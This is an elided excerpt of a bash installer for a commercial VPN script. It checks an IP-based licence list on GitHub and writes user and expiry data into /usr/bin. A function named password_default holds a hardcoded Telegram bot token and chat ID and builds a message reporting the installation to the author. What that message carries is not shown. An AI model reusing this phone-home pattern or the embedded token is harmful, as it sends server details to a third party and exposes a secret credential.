...
echo -e "         Auther : ${green}JOEXMASTER ${NC}${YELLOW}(${NC} ${green}PAK JOE ${NC}${YELLOW})${NC}"
...
data_ip="https://raw.githubusercontent.com/joexmaster1/duuls/main/izin"
checking_sc() {
  ...
  if [[ $date_list < $useexp ]]; then
    ...
    echo -e "      \033[0;36mTelegram${NC} t.me/Lemontreee3"
...
# USERNAME
rm -f /usr/bin/user
username=$(curl https://raw.githubusercontent.com/joexmaster1/duuls/main/izin | grep $MYIP | awk '{print $2}')
echo "$username" >/usr/bin/user
expx=$(curl https://raw.githubusercontent.com/joexmaster1/duuls/main/izin | grep $MYIP | awk '{print $3}')
echo "$expx" >/usr/bin/e
# DETAIL ORDER
...
Exp1=$(curl https://raw.githubusercontent.com/joexmaster1/duuls/main/izin | grep $MYIP | awk '{print $4}')
if [[ $today < $Exp1 ]]; then
sts="${Info}"
else
sts="${Error}"
...
function password_default() {
    ...
    CHATID="1659428164"
    KEY="6468426322:AAH1spIVqOUXX10760uAa9j5jbMcmObalsY"
    TIME="10"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    TEXT="Installasi VPN Script Stable V1.5.0
    ============================
